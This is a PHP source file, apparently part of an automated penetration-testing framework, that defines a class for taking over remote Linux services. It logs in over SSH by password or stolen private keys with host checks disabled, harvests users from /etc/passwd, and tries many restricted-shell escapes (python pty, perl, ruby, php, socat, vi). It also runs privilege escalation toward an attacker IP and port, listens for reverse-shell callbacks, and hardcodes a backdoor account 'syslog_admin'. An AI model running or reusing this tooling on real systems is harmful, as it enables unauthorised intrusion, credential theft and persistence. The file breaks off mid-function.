<?php



class SERVICE extends service2ssh {
    var $service_name ;
    var $service_version ;
    var $service_product ;
    var $service_extrainfo ;
    var $service_banner ;
    var $service2where ;
    var $service_hostname ;
    var $service_conf ;
    var $service_ostype;
    
    var $created_user_name;
    var $created_user_pass;
	
    public function __construct($stream,$eth,$domain,$ip,$port,$protocol) {
        parent::__construct($stream,$eth,$domain,$ip,$port,$protocol);	
        $this->created_user_name = "syslog_admin";
        $this->created_user_pass = "admin123456789";
        
        
        list($service_name,$service_version,$service_product,$service_extrainfo,$service_hostname,$service_conf,$service_ostype) = $this->port2version4run($this->port2version());
            
            $this->service_name = trim($service_name);
            $this->service_version = trim($service_version);
            $this->service_product = trim($service_product);
            $this->service_extrainfo = trim($service_extrainfo);
            $this->service_hostname = trim($service_hostname); 
            $this->service_conf = trim($service_conf);
            $this->service_ostype = trim($service_ostype);
            
            $this->service2where = "id8port = '$this->port2id' AND service2name = '$this->service_name' AND service2version = '$this->service_version' AND service2product = '$this->service_product' AND service2extrainfo = '$this->service_extrainfo' AND service2hostname = '$this->service_hostname' AND service2conf = '$this->service_conf' AND service2ostype = '$this->service_ostype' ";
            
            $sql_r = "SELECT service2name,service2version,service2product,service2extrainfo,service2hostname,service2conf,service2ostype FROM ".__CLASS__." WHERE $this->service2where ";
            if (!$this->checkBD($sql_r)) {
                $sql_w = "INSERT  INTO ".__CLASS__." (id8port,service2name,service2version,service2product,service2extrainfo,service2hostname,service2conf,service2ostype) VALUES ('$this->port2id','$this->service_name','$this->service_version','$this->service_product','$this->service_extrainfo','$this->service_hostname','$this->service_conf','$this->service_ostype'); ";
                $this->mysql_ressource->query($sql_w);
                //$this->cmd("localhost","echo '$this->root_passwd' | sudo -S tshark -i $this->eth_wlan  host $this->ip -w $this->dir_tmp/$this->ip.pcap");
                echo $this->note("Working on SERVICE for the first time");
                
            }
            
	}
	
	
	
	public function parse4etc_passwd($strings_etc_passwd){
	    $this->ssTitre(__FUNCTION__);
	    $user = array();
	    $lines_tab = explode("\n", $strings_etc_passwd);
	    foreach ($lines_tab as $line){
	        if (preg_match('|^(?<user2name>[a-zA-Z0-9\-\_]{1,}):(?<user2cpw>[[:print:]]{0,}):(?<user2uid>[0-9]{1,}):(?<user2gid>[0-9]{1,}):(?<user2full_name>[[:print:]]{0,}):(?<user2home>[[:print:]]{1,}):(?<user2shell>[[:print:]]{1,})|',$line,$user))
	        {
	            $this->yesUSERS($this->port2id, $user['user2name'], "cat /etc/passwd", $line);
	            $where = "id8port = '$this->port2id' AND user2name = '$user[user2name]' ";
	            $query = "UPDATE AUTH SET user2uid='$user[user2uid]',user2gid='$user[user2gid]',user2def='$user[user2full_name]',user2home='$user[user2home]',user2shell='$user[user2shell]' WHERE $where ;";
	            $this->mysql_ressource->query($query);
	            $this->tab_users_etc_passwd[] = $user['user2name'];
	        }
	        
	        if (preg_match('|^(?<user2name>[a-zA-Z0-9\-\_]{1,}):(?<user2cpw>[[:print:]]{0,}):(?<user2uid>[0-9]{1,}):(?<user2gid>[0-9]{1,}):(?<user2full_name>[[:print:]]{0,}):(?<user2home>[[:print:]]{1,}):/bin/bash|',$line,$user))
	        {
	            $this->tab_users_shell[] = $user['user2name'];
	        }
	        if (preg_match('|^(?<user2name>[a-zA-Z0-9\-\_]{1,}):(?<user2cpw>[[:print:]]{0,}):(?<user2uid>[0-9]{1,}):(?<user2gid>[0-9]{1,}):(?<user2full_name>[[:print:]]{0,}):(?<user2home>[[:print:]]{1,}):/bin/sh|',$line,$user))
	        {
	            $this->tab_users_shell[] = $user['user2name'];
	        }
	        
	        
	    }
	    
	    //sort($this->tab_users_etc_passwd);
	    if (!empty($this->tab_users_etc_passwd)) $this->tab_users_etc_passwd = array_filter(array_unique($this->tab_users_etc_passwd));
	    $this->article("All Users /etc/passwd","\n".$this->tab($this->tab_users_etc_passwd));
	    
	    //sort($this->tab_users_shell);
	    if (!empty($this->tab_users_shell)) $this->tab_users_shell = array_filter(array_unique($this->tab_users_shell));
	    $this->article("All Users SHELL","\n".$this->tab($this->tab_users_shell));
	}
	
	
	public function yesUSERS($id8port,$user2name,$user2methode,$user2infos) {
	    $id8port = trim($id8port);
	    $user2name = trim($user2name);
	    $user2methode = trim($user2methode);
	    $user2infosB64 = base64_encode($user2infos);
	    $user = array();
	    
	    if (preg_match('/(?<user2name>[[:print:]]{1,})/',$user2name,$user))
	    {
	        $user2name =  $user['user2name'];
	        
	    }
	    else return $this->log2error("No User : $user2name");
	    
	    $sql_r = "SELECT id8port,user2name,user2methode,user2infos FROM USERS WHERE id8port = $id8port AND user2name = '$user2name' AND user2methode = '$user2methode' AND user2infos = '$user2infosB64' ";
	    //echo "$sql_r\n";
	    if (!$this->checkBD($sql_r)) {
	        $sql_w = "INSERT INTO USERS (id8port,user2name,user2methode,user2infos) VALUES ($id8port,'$user2name','$user2methode','$user2infosB64');";
	        $this->mysql_ressource->query($sql_w);
	        $chaine = "YES USERS = $id8port:$user2name:$user2methode:$user2infos";
	        $this->note($chaine) ;
	        //$this->notify($chaine);
	        //echo "$sql_w\n";$this->pause();
	    }
	}
	
	
	
	
	
	public function service4lan($cmd_rev,$templateB64_shell,$lport,$lprotocol,$type){
	    $templateB64_id = base64_encode("%ID%");
	    $cmd1 = "php pentest.php LAN '$this->eth $this->domain $this->ip $this->port $this->protocol $lport $lprotocol $templateB64_id $templateB64_shell $type 30 listening_Server' ";
	    $this->article("cmd1", $cmd1);
	    $this->article("cmd2", $cmd_rev);
	    
	    $time = $this->stream_timeout*3 ;
	    if ($type=="client") $this->exec_parallel($cmd_rev, $cmd1, $time);
	    if ($type=="server") $this->exec_parallel($cmd1, $cmd_rev, $time);
	}
	
	
	public function stream4key8priv4str($stream,$host,$port,$login,$private_key_str,$private_key_file){
	    $this->ssTitre(__FUNCTION__);
	    $this->str2file($private_key_str, $private_key_file);
	    $obj_file = new FILE($private_key_file);
	    $public_key_file = "$obj_file->file_dir/$obj_file->file_name.pub";
	    if (!file_exists($public_key_file)) {
	        $this->key2gen4priv("",10,$private_key_file, $public_key_file);
	    }
	    return $this->stream4key8public($stream,$host,$port,$login,$public_key_file,$private_key_file, "");
	    
	}
	public function stream8ssh2key8priv4str($host,$port,$login,$private_key_str){
	    $this->ssTitre(__FUNCTION__);
	    $hash = sha1($private_key_str);
	    
	    $this->str2file($private_key_str, "/tmp/$hash.tmp");
	    $query = "file /tmp/$hash.tmp";
	    $check_pem = trim($this->req_ret_str($query));
	    if (strstr($check_pem, "PEM RSA private key")!==FALSE){
	        $this->log2succes("Convert PEM for libssh - PHP");
	        $private_key_file = $this->key2gen4priv2pem("", 10, $private_key_file,$private_key_passwd);
	    }
	    
	    return $this->stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file, $private_key_passwd);
	}
	
	public function stream8ssh2key8priv4file($host,$port,$login,$private_key_file,$private_key_passwd){
	    /*
	     https://medium.com/tsscyber/multiple-security-vulnerabilities-in-dell-emc-avamar-e114c16425d0
	     */
	    $this->ssTitre(__FUNCTION__);
	    
	    $obj_file = new FILE($stream,$private_key_file);
	    $public_key_file = "$obj_file->file_dir/$obj_file->file_name.pub";
	    
	    
	    if (!file_exists($public_key_file)) {
	        $this->key2gen4priv("",10,$private_key_file, $public_key_file);
	    }
	    return $this->stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file, $private_key_passwd);
	}
	
	
	public function stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file,$private_key_passwd){
	    $this->ssTitre(__FUNCTION__);
	    $login = trim($login);
	    
	    $query = "file $private_key_file";
	    $check_pem = trim($this->req_ret_str($query));
	    if (strstr($check_pem, "PEM RSA private key")!==FALSE){
	        $this->log2succes("Convert PEM for libssh - PHP");
	        $private_key_file = $this->key2gen4priv2pem("", 10, $private_key_file,$private_key_passwd);
	    }
	    $query = "head -5 $private_key_file";
	    $priv_keys = trim($this->req_ret_str($query));
	    if (empty($priv_keys)) return $this->log2error("Empty Private Key");
	    $query = "head -5 $public_key_file";
	    $pub_keys = trim($this->req_ret_str($query));
	    if (empty($pub_keys)) return $this->log2error("Empty Public Key");
	    $cmd = "id";
	    $this->requette("chmod 600 $private_key_file");
	    $this->requette("head -5 $private_key_file");
	    $query = "ssh -i $private_key_file $login@$this->ip -p $port -o PasswordAuthentication=no -o ConnectTimeout=15 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null  -C id";
	    $this->cmd("localhost",$query);
	    
	    
	    $con = @ssh2_connect( $host, $port,array('hostkey'=>'ssh-rsa') );
	    if($con===FALSE) {
	        $chaine = "Failed Connection";
	        $this->log2error($chaine);
	        return FALSE ;
	    }
	    $infos = "Public Key:$public_key_file\nPrivate Key:$private_key_file\nPass Key: $private_key_passwd";
	    $this->note($infos);
	    
	    
	    $this->requette("ls -al $public_key_file");
	    $this->requette("file $public_key_file");
	    $this->requette("head -5 $public_key_file");
	    
	    $this->requette("ls -al $private_key_file");
	    $this->requette("file $private_key_file");
	    $this->requette("head -5 $private_key_file");
	    if (@ssh2_auth_pubkey_file($con,$login,$public_key_file,"$private_key_file.pem",$private_key_passwd)!==FALSE) {
	        
	        //$this->yesAUTH($this->port2id, $login,$infos);
	        $this->log2succes("Identification réussie en utilisant une clé publique");
	        $this->pause();
	        return $con ;
	    } else {
	        $chaine = "Failed Public Key Authentication";
	        $this->log2error($chaine);
	        return FALSE ;
	    }
	    
	    // $stream = ssh2_shell($con, 'vt102', null, 80, 24, SSH2_TERM_UNIT_CHARS);
	    // $stream_out = ssh2_fetch_stream($stream, SSH2_STREAM_STDIO);
	    
	}
	
	
	
	public function stream8ssh8passwd($host,$port,$login,$mdp) {
	    $this->ssTitre(__FUNCTION__);
	    $host = trim($host);
	    $port = trim($port);
	    $login = trim($login);
	    $mdp = trim($mdp);
	    
	    $template_shell = "sshpass -p '$mdp' ssh $login@$host -p $port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C \"%SHELL%\" ";
	    $this->cmd("Create Stream  SSH",$template_shell);
	    
	    $con = ssh2_connect( $host, $port);
	    
	    if(!$con) {
	        $chaine = "Failed Connection";
	        $this->log2error($chaine);
	        return FALSE ;
	    }
	    else {
	        if (!@ssh2_auth_password( $con, $login, $mdp ))
	        {
	            $chaine = "Failed Auth SSH with Password";
	            $this->log2error($chaine);
	            return FALSE ;
	        }
	        else {
	            
	            $stream_shell = ssh2_shell($con, 'vt102', null, 80, 24, SSH2_TERM_UNIT_CHARS);
	            $stream = ssh2_fetch_stream($stream_shell, SSH2_STREAM_STDIO);
	            
	            //$stream = ssh2_exec($con, $data);
	            
	            if (is_resource($stream)){
	                $this->note("Success Established Connexion");
	                $this->yesAUTH($this->port2id, $login, $mdp,__FUNCTION__);
	                return $stream ;
	            }
	            else {
	                $chaine = "NOT STREAM";
	                $this->log2error($chaine);
	                var_dump($stream);
	                return FALSE; };
	        }
	    }
	    
	    
	}
	
	
	public function stream8shell2check($stream){
	    $this->ssTitre(__FUNCTION__);
	    /*
	     https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
	     https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/
	     https://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref
	     */
	    $check = "";
	    if (is_resource($stream)){
	        
	        
	        $data = "echo \$SHELL";
	        $this->article("DATA", $data);
	        fputs($stream, "$data\n");
	        
	        
	        $tmp = @stream_get_contents($stream);
	        echo "$tmp\n";
	        exec("echo '$tmp' $this->filter_file_path",$tmp2);
	        if (!empty($tmp2)) {
	            $shell_found = $tmp2[0];
	            if (strstr($shell_found, "/bin/lshell")) {$this->rouge("LIMITED SHELL: $shell_found");return FALSE;}
	            if (strstr($shell_found, "/bin/rbash"))  {$this->rouge("RESTRICTED Bash: $shell_found");return FALSE;}
	            if (strstr($shell_found, "/bin/rksh"))  {$this->rouge("Korn Shell in restricted mode: $shell_found");return FALSE;}
	            if (strstr($shell_found, "/bin/rzsh"))  {$this->rouge("RESTRICTED SHELL: $shell_found");return FALSE;}
	            if (strstr($shell_found, "/bin/rssh"))  {$this->rouge("Restricted Secure Shell: $shell_found");return FALSE;}
	            if (strstr($shell_found, "/bin/bash"))  {$this->note("Bash Shell: $shell_found");return TRUE;}
	            if (strstr($shell_found, "/bin/csh"))  {$this->note("C Shell: $shell_found");return TRUE;}
	            
	        }
	        return FALSE;
	    }
	    
	}
	
	
	public function stream4check($stream,$template_shell,$username,$userpass){
	    $this->ssTitre(__FUNCTION__);
	    $check = "";
	    $shell_found = "";
	    if (is_resource($stream)){
	        
	        
	        //$data = "/bin/bash -li ";
	        
	        stream_set_timeout($stream,$this->stream_timeout);
	        stream_set_blocking($stream, TRUE);
	        
	        
	        
	        if ($this->stream8shell2check($stream)) {
	            $this->note("Normal Shell");
	            $template_id = "%ID%";
	            
	            return array($stream,$template_id,$template_shell) ;
	        }
	        else {
	            
	            //https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/
	            
	            $data = "/usr/bin/id";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            
	            $rst_id = @stream_get_contents($stream);
	            list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
	            $id8b64 = base64_encode($id);
	            if (!empty($uid_name)){
	                $template_id = str_replace("/usr/bin/id","%ID%",$data);
	                
	                return array($stream,$template_id,$template_shell) ;
	                
	            }
	            $this->pause();
	            
	            
	            $data = "id";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            
	            $rst_id = @stream_get_contents($stream);
	            list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
	            $id8b64 = base64_encode($id);
	            if (!empty($uid_name)){
	                $template_id = str_replace("id","%ID%",$data);
	                $template_shell = str_replace("%ID%", "%SHELL%", $template_id);
	                return array($stream,$template_id,$template_shell) ;
	                
	            }
	            $this->pause();
	            
	            //  ===================================================================
	            $data = "echo $0";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            
	            $data = "echo \$PATH";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $rst_path = stream_get_contents($stream);
	            echo "$rst_path\n";
	            
	            $data = "ls $(echo \$PATH)";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $rst_path2 = stream_get_contents($stream);
	            echo "$rst_path2\n";
	            
	            
	            
	            $data = "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; /usr/bin/id";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            
	            $rst_id = stream_get_contents($stream);
	            list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
	            if (!empty($uid_name)){
	                $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
	                
	                $template_shell_new = str_replace("%ID%","%SHELL%", $template_id_new);
	                return array($stream,$template_id_new,$template_shell_new) ;
	                
	            }
	            $this->pause();
	            
	            
	            
	            $data = "help";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $rst_help =  stream_get_contents($stream);
	            echo "$rst_help\n";
	            
	            $data = "info bash";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            echo stream_get_contents($stream);
	            
	            $ip_attacker = $this->ip4addr4target($this->ip);
	            $filename = "socat";
	            $path_remotebin_socat = $this->bin2path($this->stream,$filename,$ip_attacker);
	            /*
	             
	    
	             $data = "(sleep 15; echo \"! bash -li\";sleep 8 ; ) | $path_remotebin_socat - EXEC:\"man man\",pty,stderr,setsid,sigint,ctty,sane";
	             $this->article("DATA", $data);
	             fputs($stream, "$data\n");
	             $rst_app =  stream_get_contents($stream);
	             echo "$rst_app\n";
	             $data = "echo $0";
	             $this->article("DATA", $data);
	             fputs($stream, "$data\n");
	             $tmp = stream_get_contents($stream);
	             echo "$tmp\n";
	             
	             
	             $data = "echo -e \"man man <<# >/dev/null 2>&1\n! bash -li\nwhoami > /dev/tty\nls > /dev/tty\n#\" | bash ";
	             $this->article("DATA", $data);
	             fputs($stream, "$data\n");
	             echo  stream_get_contents($stream);
	             $data = "echo $0";
	             $this->article("DATA", $data);
	             fputs($stream, "$data\n");
	             $tmp = stream_get_contents($stream);
	             echo "$tmp\n";
	             
	             
	             $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nid > /dev/tty\nls > /dev/tty\n#\" | bash ";
	             $this->article("DATA", $data);
	             fputs($stream, "$data\n");
	             echo  stream_get_contents($stream);
	             $data = "echo $0";
	             $this->article("DATA", $data);
	             fputs($stream, "$data\n");
	             $tmp = stream_get_contents($stream);
	             echo "$tmp\n";
	             
	             $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nid > /dev/tty\nls > /dev/tty\n#\"  ";
	             $this->article("DATA", $data);
	             fputs($stream, "$data\n");
	             echo  stream_get_contents($stream);
	             $data = "echo $0";
	             $this->article("DATA", $data);
	             fputs($stream, "$data\n");
	             $tmp = stream_get_contents($stream);
	             echo "$tmp\n";
	             
	             $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nid\n#\" ";
	             $this->article("DATA", $data);
	             fputs($stream, "$data\n");
	             echo  stream_get_contents($stream);
	             $data = "echo $0";
	             $this->article("DATA", $data);
	             fputs($stream, "$data\n");
	             $tmp = stream_get_contents($stream);
	             echo "$tmp\n";
	             
	             $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nid\necho \$0\n > /dev/tty\n#\" ";
	             $this->article("DATA", $data);
	             fputs($stream, "$data\n");
	             echo  stream_get_contents($stream);
	             $data = "echo $0";
	             $this->article("DATA", $data);
	             fputs($stream, "$data\n");
	             $tmp = stream_get_contents($stream);
	             echo "$tmp\n";
	             
	             
	             $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\n#\" ; export SHELL=/bin/bash:\$SHELL ; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; /usr/bin/id";
	             $this->article("DATA", $data);
	             fputs($stream, "$data\n");
	             
	             $rst_id = stream_get_contents($stream);
	             list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
	             if (!empty($uid_name)){
	             $cmd = "%CMD%";
	             $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
	             $template_cmd_new = str_replace("%ID%", "%CMD%", $template_id_new);
	             $template_shell_new = str_replace("%CMD%","%SHELL%", $template_cmd_new);
	             return array($stream,$template_id_new,$template_cmd_new,$template_shell_new) ;
	             
	             }
	             $this->pause();
	             
	             
	             $data = "vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\n# ; export SHELL=/bin/bash:\$SHELL ; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; /usr/bin/id";
	             $this->article("DATA", $data);
	             fputs($stream, "$data\n");
	             
	             $rst_id = stream_get_contents($stream);
	             list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
	             if (!empty($uid_name)){
	             $cmd = "%CMD%";
	             $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
	             $template_cmd_new = str_replace("%ID%", "%CMD%", $template_id_new);
	             $template_shell_new = str_replace("%CMD%","%SHELL%", $template_cmd_new);
	             return array($stream,$template_id_new,$template_cmd_new,$template_shell_new) ;
	             
	             }
	             $this->pause();
	             */
	            
	            $data = "export SHELL=/bin/bash:\$SHELL ; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; /usr/bin/id";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            
	            $rst_id = stream_get_contents($stream);
	            list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
	            if (!empty($uid_name)){
	                $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
	                $template_shell_new = str_replace("%ID%","%SHELL%", $template_id_new);
	                return array($stream,$template_id_new,$template_shell_new) ;
	                
	            }
	            $this->pause();
	            
	            
	            
	            $data = "printf \"%s\\n\" $0";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            
	            
	            
	            
	            $data = "?";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            
	            $data = "-h";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            
	            $data = "--help";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            
	            $data = "\$SHELL --version";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            
	            $data = "echo \$BASH_VERSION";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            
	            $data = "PS1= ";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            
	            
	            $data = "chsh -l";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            
	            $data = "printenv";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            
	            $data = "$path_remotebin_socat exec:'sh -li',pty,stderr,setsid,sigint,sane";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            $data = "echo $0";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            
	            $data = "python -c 'import pty; pty.spawn(\"/bin/bash\")'";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            $data = "echo $0";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            
	            $data = "php -r 'system(\"/bin/bash -li\");'";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            
	            $data = "echo $0";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            
	            $data = "perl -e \"exec \\\"/bin/bash -li\\\";\"  ";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            $data = "echo $0";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            
	            $data = "ruby -e \"exec \\\"/bin/bash -li\\\";\"  ";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            $data = "echo $0";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            
	            $data = "/usr/bin/script -qc /bin/bash -li /dev/null";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            $data = "echo $0";
	            $this->article("DATA", $data);
	            fputs($stream, "$data\n");
	            $tmp = stream_get_contents($stream);
	            echo "$tmp\n";
	            
	            
	            $rst_app = $rst_path.$rst_path2.$rst_help;
	            
	            
	            foreach ($this->tab_sudo8app2shell as $app){
	                if (!empty($app)){
	                    if (strstr($rst_app,$app)!==FALSE){
	                        $obj_bin = new bin4linux($app);
	                        $this->log2succes("Found APP to Bash");
	                        $this->article("APP", $obj_bin->file_path);
	                        $query = "echo '$rst_app' | grep '$app' ";
	                        //system($query);
	                        $attacker_ip = $this->ip4addr4target($this->ip);
	                        $attacker_port = rand(1024,65535);
	                        $shell = "/bin/sh";
	                        $sudo = FALSE;
	                        
	                        $cmd = "$shell";
	                        $data = $obj_bin->elf4root2cmd($this->ip, $attacker_port, $shell, $sudo, $userpass, $cmd);
	                        $this->article("DATA", $data);
	                        fputs($stream, "$data\n");
	                        $data = "cd /tmp";
	                        $this->article("DATA", $data);
	                        fputs($stream, "$data\n");
	                        $data = "/usr/bin/id";
	                        $this->article("DATA", $data);
	                        fputs($stream, "$data\n");
	                        
	                        $rst_id = stream_get_contents($stream);
	                        
	                        list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
	                        if (!empty($uid_name)){
	                            
	                            
	                            $data_id = $obj_bin->elf4root2cmd($this->ip, $attacker_port, $shell, $sudo, $userpass, $cmd);
	                            
	                            $template_id_new = "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; %ID%";
	                            
	                            $template_shell_new = str_replace("%SHELL%", " $data_id; $template_id_new", $template_shell);
	                            $template_shell_new = str_replace("%ID%","%SHELL%", $template_shell_new);
	                            return array($stream,$template_id_new,$template_shell_new) ;
	                            
	                        }
	                    }
	                }
	            }
	            // ==================================================================
	            
	            
	            
	            // $path_remotebin_socat file:`tty`,raw,echo=0 tcp-listen:4444
	            // echo -e "su - root <<! >/dev/null 2>&1\nsateam123456789\nwhoami > /dev/tty\nls > /dev/tty\n!" | bash
	            
	            
	            return FALSE;
	        }
	    }
	    
	}
	
	
	
	public function  stream8client($lport,$info,$whois,$time2wait){
	    $this->titre(__FUNCTION__);
	    $result = "";
	    // http://php.net/manual/fr/function.socket-import-stream.php
	    $info = trim($info);
	    $lport = trim($lport);
	    $time2wait = (int)$time2wait;
	    
	    if ($this->protocol=='T') $socket = stream_socket_client("tcp://$this->ip:$lport", $errno, $errstr);
	    if ($this->protocol=='U') $socket = stream_socket_client("udp://$this->ip:$lport", $errno, $errstr);
	    
	    if (!$socket) {
	        echo "$errstr ($errno)\n";
	        exit();
	    } else {
	        $this->article("Server Listenning on Port", $lport);
	        $this->article("Global TimeOut", $time2wait);
	        
	        $stream = stream_socket_accept($socket,$time2wait);
	        
	        
	        if (!is_resource($stream)) {
	            echo 'Impossible de créer le socket : '. socket_strerror(socket_last_error()) . PHP_EOL;
	        }
	        stream_set_blocking($stream, FALSE);
	        //stream_set_timeout($stream,60);
	        
	        var_dump( posix_ttyname(STDIN) );
	        var_dump( posix_ttyname(STDOUT) );
	        
	        
	        $os = trim($this->ip2os4arch($this->ip2os()));
	        switch ($os){
	            
	            
	            
	            case "Linux" :
	            case "Unix" :
	            case "linux" :
	            case "unix" :
	            case "cisco" :
	            default:
	                $cmd_id = "id";
	                $result .= $this->stream4root($stream);
	                
	                
	                break ;
	        }
	        $this->pause();
	        fclose($socket);
	        
	    }
	    echo $result;
	    return $result;
	}
	
	
	
	
	public function  stream8server($lport,$lprotocol,$templateB64_id,$templateB64_shell,$whois,$time2wait){
	    $this->titre(__FUNCTION__);
	    $result = "";
	    // http://php.net/manual/fr/function.socket-import-stream.php
	    
	    $lport = trim($lport);
	    $lprotocol = trim($lprotocol);
	    $time2wait = (int)$time2wait;
	    $template_id = base64_decode($templateB64_id);
	    
	    if ($lprotocol=='T') $socket8server = stream_socket_server("tcp://".$this->ip4addr4target($this->ip).":$lport", $errno, $errstr);
	    if ($lprotocol=='U') $socket8server = stream_socket_server("udp://".$this->ip4addr4target($this->ip).":$lport", $errno, $errstr, STREAM_SERVER_BIND);
	    
	    var_dump($socket8server);
	    
	    if (!$socket8server) {
	        echo "$errstr ($errno)\n";
	        die();
	    } else {
	        $this->article("Server Listenning on Port", $lport);
	        $this->article("Protocol", $lprotocol);
	        $this->article("Template ID",$template_id );
	        $this->article("Whois", $whois);
	        $this->article("Global TimeOut", $time2wait);
	        
	        
	        if ($lprotocol=='T') $stream = stream_socket_accept($socket8server,$time2wait);
	        if ($lprotocol=='U') $stream = $socket8server;
	        var_dump($stream);
	        var_dump(stream_socket_get_name($stream,TRUE));
	        
	        if (!is_resource($stream)) {
	            echo 'Impossible de créer la socket : '. socket_strerror(socket_last_error()) . PHP_EOL;
	            die();
	        }
	        stream_set_blocking($stream, FALSE);
	        //stream_set_timeout($stream,60);
	        
	        $this->article("STDIN",posix_ttyname(STDIN));
	        $this->article("STDOUT",posix_ttyname(STDOUT));
	        var_dump(stream_get_meta_data($stream));
	        
	        
	        $os = trim($this->ip2os4arch($this->ip2os()));
	        switch ($os){
	            
	            case "Linux" :
	            case "Unix" :
	            case "linux" :
	            case "unix" :
	            case "cisco" :
	            default:
	                
	                $id = str_replace("%ID%", "id", $template_id);
	                $rst = $this->req_str($stream, $id, 10," | grep 'uid=' ");
